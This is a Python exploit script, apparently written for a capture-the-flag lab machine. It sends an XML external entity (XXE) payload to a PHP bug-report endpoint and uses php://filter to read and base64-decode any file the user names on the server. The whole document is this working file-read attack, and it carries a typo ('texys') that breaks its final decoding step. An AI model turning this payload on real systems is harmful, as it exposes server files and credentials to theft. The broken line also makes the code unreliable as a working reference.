import requests
from bs4 import BeautifulSoup
import base64
import urllib.parse

while True:
    filename = input("enter file name > ")
    main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://MACHINE_IP",
        "Referer": "http://MACHINE_IP/log_submit.php",
        "Accept-Encoding": "gzip, deflate",
    }

    main_payload = f'''<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={filename}"> ]>
            <bugreport>
            <title>&xxe;</title>
            <cwe>dfsjfsdlk</cwe>
            <cvss>dfd</cvss>
            <reward>dsfds</reward>
            </bugreport>'''

    turn_byte = main_payload.encode('ascii')
    bs = base64.b64encode(turn_byte)
    back_as = bs.decode('ascii')
    url_enc = urllib.parse.quote(back_as)


    body = f"data={url_enc}"

    send_req = requests.post(main_url, headers=headers, data=body).text

    soup = BeautifulSoup(send_req, 'html.parser')

    tds = soup.findAll('td')[1]
    texts = tds.text
    final = base64.b64decode(texys)

    print(BeautifulSoup(final, 'html.parser').prettify())

